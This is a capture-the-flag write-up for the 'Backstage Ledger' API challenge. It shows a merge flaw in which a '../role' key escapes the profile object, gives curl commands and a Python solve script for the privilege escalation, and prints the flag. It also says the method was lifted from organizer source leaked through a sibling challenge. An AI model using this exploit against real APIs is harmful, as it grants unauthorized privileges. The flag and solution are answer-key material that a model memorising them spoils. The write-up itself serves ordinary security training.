---
title: "Backstage Ledger"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: medium
points: 500
flag_format: "safctf{...}"
author: "Strawhats"
---

# Backstage Ledger

> **Category:** API · **Points:** 500 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Target:** `http://54.72.82.22:8340`

## The bug: prototype-pollution-style key escape in the profile merge

The app exposes two services:

```
GET   /api/profile       -> the session user object
PATCH /api/profile       -> deep-merges the body's "profile" into that user
GET   /api/settlement    -> 200 with the flag iff user["role"] == "producer"
```

The merge copies each key of the supplied `profile` into `user["profile"]`,
**except** keys beginning with `../`, which it writes into the *parent* user
object with the prefix stripped:

```python
for key, val in d.get("profile", {}).items():
    if key.startswith("../"):
        user[key[3:]] = val        # escapes the profile sub-dict
    else:
        user["profile"][key] = val
```

So `{"profile": {"../role": "producer"}}` sets `user["role"]` directly. The
body must contain **only** the `profile` key (the handler rejects anything else),
and the same `X-Session` header must be used on both requests because the user
object is keyed by it.

## Exploit

```sh
curl -s -X PATCH -H 'X-Session: k' -H 'Content-Type: application/json' \
     -d '{"profile":{"../role":"producer"}}' http://54.72.82.22:8340/api/profile
curl -s -H 'X-Session: k' http://54.72.82.22:8340/api/settlement
# {"message":"safctf{414329f08fe10f2027b4afeb2e5bba9b}","ok":true}
```

## Reproduce

```sh
/home/nomad/safaricom_ctf/.venv/bin/python chal/api/backstage-ledger/solve.py
```

## How it was found

The organizer runtime source leaked from a **sibling challenge** — see
`chal/_shared/organizer-service.py`. `kind == "api-merge"` is this challenge, and
the escape is three lines of it. Do not re-derive this by black-box fuzzing.

## Solve script

`api/backstage-ledger/solve.py`:

```python
#!/usr/bin/env python3
"""Backstage Ledger (API, 300) -- http://54.72.82.22:8340

The challenge runs the shared organizer runtime with kind="api-merge".
/api/profile deep-merges the client-supplied "profile" object into the session
user.  A key beginning with "../" escapes the profile sub-dict and writes the
PARENT object instead -- so "../role" sets user["role"] directly.

  PATCH /api/profile  {"profile": {"../role": "producer"}}
  GET   /api/settlement    -> 200 {"message": "safctf{...}", "ok": true}

Requires the same X-Session token on both calls (the user is keyed by it).
"""
import sys, requests

BASE = "http://54.72.82.22:8340"
SESSION = "backstage-probe"

def main():
    h = {"X-Session": SESSION, "Content-Type": "application/json"}
    before = requests.get(BASE + "/api/profile", headers=h, timeout=15).json()
    print("[*] before:", before)

    r = requests.patch(BASE + "/api/profile", headers=h,
                       json={"profile": {"../role": "producer"}}, timeout=15)
    print("[*] after patch:", r.json())
    assert r.json().get("role") == "producer", "key escape failed"

    r = requests.get(BASE + "/api/settlement", headers=h, timeout=15)
    print("[+] settlement:", r.status_code, r.text)
    assert r.status_code == 200 and "safctf{" in r.text, "no flag"
    return 0

if __name__ == "__main__":
    sys.exit(main())
```

## Tools

**Used in this solve:**

- Python 3 (solver)
- curl

**Other tools that fit this category:**

- Burp Suite (repeater/intruder)
- ffuf (endpoint & param fuzzing)
- Postman/httpie
- jwt_tool
- arjun (param mining)

## Flag

```
safctf{414329f08fe10f2027b4afeb2e5bba9b}
```
